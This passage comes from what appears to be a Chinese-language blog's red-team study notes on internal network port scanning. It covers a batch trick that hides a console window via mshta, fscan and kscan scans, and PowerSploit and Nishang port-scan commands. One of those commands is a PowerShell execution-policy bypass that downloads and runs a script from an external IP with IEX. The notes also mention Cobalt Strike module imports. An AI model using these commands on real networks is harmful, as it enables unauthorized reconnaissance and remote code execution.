class="number">1</span>是步长，可为负</span><br></pre></td></tr></table></figure><p>Tips:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">echo off <span class="operator">/</span><span class="operator">/</span>将后面多余的输出删去，不显示命令本身，不用一段一隔</span><br><span class="line">echo <span class="keyword">on</span> <span class="operator">/</span><span class="operator">/</span>一段一隔</span><br><span class="line">pause <span class="operator">/</span><span class="operator">/</span>暂停，卡扣</span><br><span class="line"><span class="variable">@echo</span> off <span class="operator">/</span><span class="operator">/</span>将第一行的命令输出也删掉</span><br><span class="line"><span class="keyword">call</span> C:\<span class="number">2.</span>bat  <span class="operator">/</span><span class="operator">/</span>调用(运行并回显)C盘下面<span class="number">2.</span>bat的内容</span><br><span class="line">cmd命令后台运行</span><br><span class="line"><span class="variable">@echo</span> off</span><br><span class="line">if &quot;%1&quot; <span class="operator">=</span><span class="operator">=</span> &quot;h&quot; goto <span class="keyword">begin</span></span><br><span class="line">mshta vbscript:createobject(&quot;wscript.shell&quot;).run(&quot;&quot;&quot;%~nx0&quot;&quot; h&quot;,<span class="number">0</span>)(window.close)<span class="operator">&amp;&amp;</span>exit</span><br><span class="line">:<span class="keyword">begin</span></span><br><span class="line">REM</span><br></pre></td></tr></table></figure><p>工具kscan会好用一点</p><p>fscan -t 192.168.45.0&#x2F;24 –encoding gbk</p><p>暂时无法在飞书文档外展示此内容</p><p>另外端口扫描就是powersploit和redteamtool</p><p>powersploit</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">上传到靶机执行</span><br><span class="line">powershell ‐<span class="keyword">exec</span> bypass Import‐<span class="keyword">Module</span> .\Invoke‐Portscan.ps1;Invoke‐Portscan ‐Hosts <span class="number">192.168</span><span class="number">.41</span><span class="number">.0</span><span class="operator">/</span><span class="number">24</span> ‐T <span class="number">4</span> ‐ports <span class="string">&#x27;445,8080,3389,80&#x27;</span> ‐oA c:\<span class="number">1.</span>txt</span><br><span class="line"></span><br><span class="line">远程执行</span><br><span class="line">powershell ‐<span class="keyword">exec</span> bypass ‐c IEX (<span class="keyword">New</span>‐ObjectSystem.Net.Webclient).DownloadString(<span class="string">&#x27;http://118.178.134.226:8080/Invoke‐Portscan.ps1&#x27;</span>);import‐<span class="keyword">module</span> .\Invoke‐Portscan.ps1;Invoke‐Portscan ‐Hosts <span class="number">192.168</span><span class="number">.41</span><span class="number">.0</span><span class="operator">/</span><span class="number">24</span> ‐T <span class="number">4</span> ‐ports <span class="string">&#x27;445,8080,3389,80&#x27;</span> ‐oA c:\<span class="number">1.</span>txt</span><br></pre></td></tr></table></figure><p>Nishang</p><p>针对powershell的渗透工具，</p><p>类似的Invoke‐Portscan.ps1;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="operator">-</span>command &quot;&amp;&#123;Invoke-PortScan -StartAdress 192.168.41.1 -EndAddress 192.168.41.21 -ResolveHost&#125;&quot;</span><br><span class="line">powershell ‐command &quot;&amp; &#123; import‐module .\nishang\nishang.psm1; Invoke‐PortScan ‐StartAddress 192.168.41.1 ‐EndAddress 192.168.41.255 -Ports 445 ‐ResolveHost &#125;&quot; </span><br></pre></td></tr></table></figure><p>可以先导入模块在cs中，powershell-import +模块位置</p><p>然后直接使用就行</p>]]></content>
      
      
      
        <tags>
            
            <tag> caosuan </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
